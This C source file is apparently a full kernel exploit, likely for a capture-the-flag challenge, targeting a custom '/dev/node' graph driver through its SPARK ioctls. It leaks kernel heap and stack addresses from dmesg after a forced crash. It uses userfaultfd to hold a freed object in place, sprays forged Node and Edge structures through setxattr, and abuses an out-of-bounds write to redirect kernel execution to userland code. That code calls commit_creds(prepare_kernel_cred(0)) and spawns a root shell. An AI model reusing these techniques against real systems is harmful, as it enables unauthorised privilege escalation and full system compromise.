#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <sys/stat.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>

struct spark_ioctl_query {
  uint32_t fd1;
  uint32_t fd2;
  uint64_t distance;
};

#define DEV_PATH "/dev/node"

#define SPARK_QUERY 0xC010D903
#define SPARK_LINK 0x4008D900
#define SPARK_GETINFO 0x8018D901
#define SPARK_FINALIZE 0xD902

#define N 12
static int fd[N];
static int extrafd[10];
static uint64_t heap_addr, stack_addr;

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)


typedef int __attribute__((regparm(3)))(*_commit_creds)(void*);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(void*);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

unsigned long user_cs, user_ss, user_rflags;
void *stack;

static int use_userfaultfd = 0;
static int page_size;

struct Edge {
  struct Edge *prev;
  struct Edge *next;
  void *to;
  uint64_t w;
};

struct NodeArray {
  uint64_t size;
  uint64_t capacity;
  struct Node** array;
};

struct Node {
  uint64_t node_id;
  uint32_t refcnt;
  uint32_t field_C;
  char state_lock[32];
  uint32_t traversed;
  uint32_t field_34;
  char nb_lock[32];
  uint64_t outd;
  struct Edge* prev;
  struct Edge* next;
  uint64_t reachid;
  struct NodeArray* reach_nodes;
};

struct Node node, node2;
struct Edge edge0;

static void LINK(int a, int b, unsigned int weight) {
  assert(ioctl(fd[a], SPARK_LINK, fd[b] | ((unsigned long long) weight << 32)) == 0);
}

static void LINKE(int a, int b, unsigned int weight) {
  assert(ioctl(extrafd[a], SPARK_LINK, extrafd[b] | ((unsigned long long) weight << 32)) == 0);
}

static void QUERY(int a, int b) {
  struct spark_ioctl_query qry = {
    .fd1 = fd[a],
    .fd2 = fd[b],
  };
  assert(ioctl(fd[1], SPARK_QUERY, &qry) == 0);
}


void save_stats() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n" 
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_rflags) : : "memory"
        );
}

void shell() {
    system("/bin/sh");
}

static void kernel_shellcode() {
  unsigned long tmp;
  int i;
  uint64_t *ptr = &tmp;

  // Search stack for kernel address
  for (i = 0; i < 20; i++) {
    if (((ptr[i]) >> 48) == 0xFFFF && (ptr[i] & 0xFFF) == 0xB09) {
      commit_creds = (_commit_creds)(ptr[i] - 0xffffffff814b0b09 + 0xffffffff810be550);
      prepare_kernel_cred = (_prepare_kernel_cred)(ptr[i] - 0xffffffff814b0b09 + 0xffffffff810be9c0);
      break;
    }
  }

  // Failed, crash
  if (i >= 20) return;

  // Set creds
  commit_creds(prepare_kernel_cred(0));

  // Return to userland
  asm(
    "return_to_user:\n"
    "push %0\n"
    "push %1\n"
    "push %2\n"
    "push %3\n"
    "push %4\n"
    "swapgs\n"
    "iretq\n"
    : : "r"(user_ss), "r"(stack+0x8000), "r"(user_rflags), "r"(user_cs), "r"(shell) : "memory"
  );
}

static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
       if (page == MAP_FAILED)
           errExit("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
      file descriptor */

    for (;;) {

       /* See what poll() tells us about the userfaultfd */

       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1)
           errExit("poll");

       /* Read an event from the userfaultfd */

       nread = read(uffd, &msg, sizeof(msg));
       if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
       }

       if (nread == -1)
           errExit("read");

       /* We expect only one kind of event; verify that assumption */

       if (msg.event != UFFD_EVENT_PAGEFAULT) {
           fprintf(stderr, "Unexpected event on userfaultfd\n");
           exit(EXIT_FAILURE);
       }

        /* Copy the page pointed to by 'page' into the faulting
          region. Vary the contents that are copied in, so that it
          is more obvious that each fault is handled separately. */

       if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE) {
            printf("write fault\n");

            struct uffdio_range range;
            range.start = msg.arg.pagefault.address & ~(page_size - 1);
            range.len = page_size;
            if (ioctl(uffd, UFFDIO_UNREGISTER, &range) == -1)
                errExit("ioctl-UFFDIO_UNREGISTER");
            if (ioctl(uffd, UFFDIO_WAKE, &range) == -1)
                errExit("ioctl-UFFDIO_WAKE");

       } else {
           printf("read fault @ %p\n", msg.arg.pagefault.address);
           assert(ioctl(fd[1], SPARK_FINALIZE) == 0);

           *(unsigned long int *)page = 0;
           fault_cnt++;

           uffdio_copy.src = (unsigned long) page;

           uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
           uffdio_copy.len = page_size;
           uffdio_copy.mode = 0;
           uffdio_copy.copy = 0;
           if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
               errExit("ioctl-UFFDIO_COPY");
        }
    }
}

int exploit_ctrl(char *prog) {
  // leak by dmesg

  char buf[0x40];
  snprintf(buf, sizeof(buf), "%s crash", prog);
  system(buf);
  
  FILE *fp = popen("dmesg | grep -A10 \"general protection fault\" | grep \"R12: \" | /bin/head -n1 | /bin/awk -F \"R12: \" '{print $2}'", "r");
  if (!fp)
    errExit("popen");

  fgets(buf, sizeof(buf)-1, fp);
  fclose(fp);

  unsigned long haddr = strtoull(buf, NULL, 16);

  if (haddr >> 56 != 0xFF)
    errExit("getaddr");

  fp = popen("dmesg | grep -A10 \"general protection fault\" | grep \"RSP: 0018:\" | /bin/head -n1 | /bin/awk -F \"RSP: 0018:\" '{print $2}' | awk -F \" EFLAGS:\" '{print $1}'", "r");
  if (!fp)
    errExit("popen");

  fgets(buf, sizeof(buf)-1, fp);
  fclose(fp);

  unsigned long saddr = strtoull(buf, NULL, 16);

  if (saddr >> 56 != 0xFF)
    errExit("getaddr");

  // crash again

  snprintf(buf, sizeof(buf), "%s crash", prog);
  system(buf);

  printf("[+] Get address %llx %llx\n", haddr, saddr);
  // do the exploit
  // sleep(3);
  snprintf(buf, sizeof(buf), "%s %llx %llx", prog, haddr, saddr);
  system(buf);
}

int main(int argc, char **argv) {

  if (argc < 2) {
    exploit_ctrl(argv[0]);
    exit(0);
  } else if (!strcmp("crash", argv[1])) {
    use_userfaultfd = 0;
    heap_addr = 0x4141424243434444;
  } else {
    heap_addr = strtoull(argv[1], NULL, 16);
    stack_addr = strtoull(argv[2], NULL, 16);
    use_userfaultfd = 1;
  }

  printf("Use address: %llx\n", heap_addr);

    // Setup userfaultfd

    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    unsigned long len;  /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    page_size = sysconf(_SC_PAGE_SIZE);
    len = 4 * page_size;

    /* Create and enable userfaultfd object */

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
       errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
       errExit("ioctl-UFFDIO_API");

    /* Create a private anonymous mapping. The memory will be
      demand-zero paged--that is, not yet allocated. When we
      actually touch the memory, it will be allocated via
      the userfaultfd. */

    addr = mmap(NULL, len + 0x1000, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
       errExit("mmap");

    /* Register the memory range of the mapping we just created for
      handling by the userfaultfd object. In mode, we request to track
      missing pages (i.e., pages that have not yet been faulted in). */

  if (use_userfaultfd) {
    uffdio_register.range.start = (unsigned long)(addr + 0x1000);
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
       errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
       errno = s;
       errExit("pthread_create");
    }
  }

  int n;
  if (use_userfaultfd) {
    n = N;
  } else {
    n = 2;
  }

  for (int i = 0; i < n; i++) {
    fd[i] = open(DEV_PATH, O_RDONLY);
    assert(fd[i] >= 0);
  }

  memset(&edge0, '\0', sizeof(struct Edge));
  memset(&node, '\0', sizeof(struct Node));
  memset(&node2, '\0', sizeof(struct Node));

  edge0.prev = heap_addr;
  edge0.next = heap_addr;
  edge0.to = &node;
  edge0.w = 0xdeadbeef;

  node.refcnt = 1;
  node.node_id = 0x13371337;
  node.prev = (char *)&node + 0x60;
  node.next = (char *)&node + 0x60;

  node2.refcnt = 2;
  node2.node_id = 0x13381338;
  node2.prev = (char *)&node2 + 0x60;
  node2.next = (char *)&node2 + 0x60;
  node2.reachid = ((stack_addr + 0x20150) - (heap_addr - 0x60)) / 8;     // out-of-bound write index

  if (!use_userfaultfd) {
    LINK(0, 1, 100);
    close(fd[0]);

    // Directly crash the program to leak address
    assert(ioctl(fd[1], SPARK_FINALIZE) == 0);
    close(fd[1]);
  } else {

    save_stats();
    stack = mmap(0, 0x10000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    for (int i = 0; i < 3; i++) {
      extrafd[i] = open(DEV_PATH, O_RDONLY);
      assert(extrafd[i] >= 0);
    }

    LINKE(0, 1, 1000);
    LINKE(1, 2, 1000);
    assert(ioctl(extrafd[0], SPARK_FINALIZE) == 0);

    for (int i = 1; i < N-1; i++) {
      LINK(i, i+1, 1000);
    }
    LINK(0, 1, 100);
    close(fd[0]);

    // Overwrite edges chain pointer (do not trigger userfault)
    char *attr = addr;
    memset(attr, '\0', 0x80);
    *(uint64_t *)(attr+0x60) = &edge0;
    *(uint64_t *)(attr+0x68) = &edge0;
    setxattr("/init", "attr", attr, 128, 0);

    // Trigger userfault to keep refcount (otherwise we cannot traverse)
    attr = addr + 0x1000 - 0x78;
    memset(attr, '\0', 0x78);
    *(uint64_t *)(attr+0x8) = 0x1;
    *(uint64_t *)(attr+0x60) = &edge0;
    *(uint64_t *)(attr+0x68) = &edge0;
    setxattr("/init", "attr", attr, 128, 0);

    edge0.prev = (char *)&node + 0x60;
    edge0.next = (char *)&node + 0x60;
    edge0.to = &node2;
    edge0.w = kernel_shellcode;   // out-of-bound write value (overwrite RIP)
    node.prev = &edge0;
    node.next = &edge0;

    // Use another group of nodes, we could cheat query function to start from reach id 2, which is our crafted structure in userspace
    struct spark_ioctl_query qry = {
      .fd2 = fd[10],
      .fd1 = extrafd[2],
    };
    assert(ioctl(fd[1], SPARK_QUERY, &qry) == 0);
  }


  printf("Done!\n");
  return 0;
}
